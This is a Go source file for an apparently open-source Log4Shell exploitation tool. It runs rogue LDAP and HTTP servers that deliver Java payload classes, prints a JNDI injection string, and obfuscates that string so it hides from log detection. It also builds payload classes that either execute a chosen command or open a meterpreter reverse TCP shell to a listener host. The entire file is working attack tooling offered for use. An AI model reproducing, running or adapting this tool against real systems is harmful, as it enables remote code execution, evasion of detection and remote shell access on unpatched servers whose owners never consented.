package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"

	"github.com/For-ACGN/Log4Shell"
)

var (
	config   log4shell.Config
	certFile string
	keyFile  string
	obfRaw   string
	noToken  bool
	hide     bool
	genClass string
	genArgs  string
	gnClass  string
	genOut   string
)

func init() {
	banner()

	flag.CommandLine.SetOutput(os.Stdout)
	flag.StringVar(&config.Hostname, "host", "127.0.0.1", "server IP address or domain name")
	flag.StringVar(&config.PayloadDir, "payload", "payload", "payload(java class) directory")
	flag.StringVar(&config.HTTPNetwork, "http-net", "tcp", "http server network")
	flag.StringVar(&config.HTTPAddress, "http-addr", ":8080", "http server address")
	flag.StringVar(&config.LDAPNetwork, "ldap-net", "tcp", "ldap server network")
	flag.StringVar(&config.LDAPAddress, "ldap-addr", ":3890", "ldap server address")
	flag.BoolVar(&config.AutoCert, "auto-cert", false, "use ACME client to sign certificate automatically")
	flag.BoolVar(&config.EnableTLS, "tls-server", false, "enable ldaps and https server")
	flag.StringVar(&certFile, "tls-cert", "cert.pem", "tls certificate file path")
	flag.StringVar(&keyFile, "tls-key", "key.pem", "tls private key file path")
	flag.StringVar(&obfRaw, "obf", "", "obfuscate malicious(payload) string")
	flag.BoolVar(&noToken, "no-token", false, "not add random token when use obfuscate")
	flag.BoolVar(&hide, "hide", false, "hide obfuscated malicious(payload) string in log4j2")
	flag.StringVar(&genClass, "gen", "", "generate Java class file with template name")
	flag.StringVar(&genArgs, "args", "", "arguments about generate Java class file")
	flag.StringVar(&gnClass, "class", "", "specify the new class name")
	flag.StringVar(&genOut, "output", "", "generated Java class file output path")
	flag.Parse()
}

func banner() {
	fmt.Println()
	fmt.Println("  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::     ")
	fmt.Println("  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:     ")
	fmt.Println("  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+     ")
	fmt.Println("  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+     ")
	fmt.Println("  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+     ")
	fmt.Println("  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#     ")
	fmt.Println("  ######## ########   ########        ###   ########  ###    ### ########## ######## ########")
	fmt.Println()
	fmt.Println("                                                        https://github.com/For-ACGN/Log4Shell")
	fmt.Println()
}

func main() {
	switch {
	case obfRaw != "":
		obfuscate()
		return
	case genClass != "":
		generateClass()
		return
	}

	// load tls certificate
	if config.EnableTLS {
		cert, err := tls.LoadX509KeyPair(certFile, keyFile)
		checkError(err)
		config.TLSCert = cert
	}
	config.Logger = os.Stdout

	// start log4shell server
	server, err := log4shell.New(&config)
	checkError(err)

	// print one example for obfuscate string easily
	var ldap string
	if server.IsEnableTLS() {
		ldap = "ldaps"
	} else {
		ldap = "ldap"
	}
	_, port, err := net.SplitHostPort(server.LDAPAddress())
	checkError(err)
	address := net.JoinHostPort(config.Hostname, port)
	example := fmt.Sprintf("${jndi:%s://%s/Calc}", ldap, address)
	fmt.Printf("example: %s\n\n", example)

	err = server.Start()
	checkError(err)

	// wait signal for stop log4shell server
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	<-signalCh

	err = server.Stop()
	checkError(err)
}

func obfuscate() {
	var (
		obfuscated   string
		rawWithToken string
	)
	if hide {
		obfuscated, rawWithToken = log4shell.ObfuscateWithDollar(obfRaw, !noToken)
	} else {
		obfuscated, rawWithToken = log4shell.Obfuscate(obfRaw, !noToken)
	}
	var raw string
	if noToken {
		raw = obfRaw
	} else {
		raw = rawWithToken
	}
	fmt.Printf("raw: %s\n\n", raw)
	fmt.Println(obfuscated)
	if noToken {
		return
	}
	const notice = "\nEach string can only be used once, or wait %d seconds.\n"
	fmt.Printf(notice, log4shell.TokenExpireTime)
}

func generateClass() {
	switch genClass {
	case "execute":
		generateExecute()
	case "reverse_tcp":
		generateReverseTCP()
	case "":
		fmt.Println("supported Java class template: execute, reverse_tcp")
		return
	default:
		log.Fatalf("[error] unknown Java class template name: \"%s\"\n", genClass)
	}
	fmt.Println("Save generated Java class file to the path:", genOut)
}

func generateExecute() {
	template, err := os.ReadFile("template/Execute.class")
	checkError(err)

	args := flag.NewFlagSet("Execute", flag.ExitOnError)
	args.SetOutput(os.Stdout)
	var command string
	args.StringVar(&command, "cmd", "", "the executed command")
	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))

	if command == "" {
		args.PrintDefaults()
		return
	}
	if gnClass == "" {
		gnClass = "Execute"
	}
	if genOut == "" {
		genOut = filepath.Join(config.PayloadDir, gnClass+".class")
	}

	data, err := log4shell.GenerateExecute(template, command, gnClass)
	checkError(err)
	err = os.WriteFile(genOut, data, 0600)
	checkError(err)
}

func generateReverseTCP() {
	template, err := os.ReadFile("template/ReverseTCP.class")
	checkError(err)

	args := flag.NewFlagSet("meterpreter/reverse_tcp", flag.ExitOnError)
	args.SetOutput(os.Stdout)
	var (
		host string
		port uint
	)
	args.StringVar(&host, "host", "", "listener host")
	args.UintVar(&port, "port", 4444, "listener port")
	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))

	if host == "" {
		args.PrintDefaults()
		return
	}
	if port > 65535 {
		fmt.Println("[error]", "invalid port:", port)
		return
	}
	if gnClass == "" {
		gnClass = "ReverseTCP"
	}
	if genOut == "" {
		genOut = filepath.Join(config.PayloadDir, gnClass+".class")
	}

	data, err := log4shell.GenerateReverseTCP(template, host, uint16(port), "", gnClass)
	checkError(err)
	err = os.WriteFile(genOut, data, 0600)
	checkError(err)
}

func checkError(err error) {
	if err != nil {
		log.Fatalln("[error]", err)
	}
}
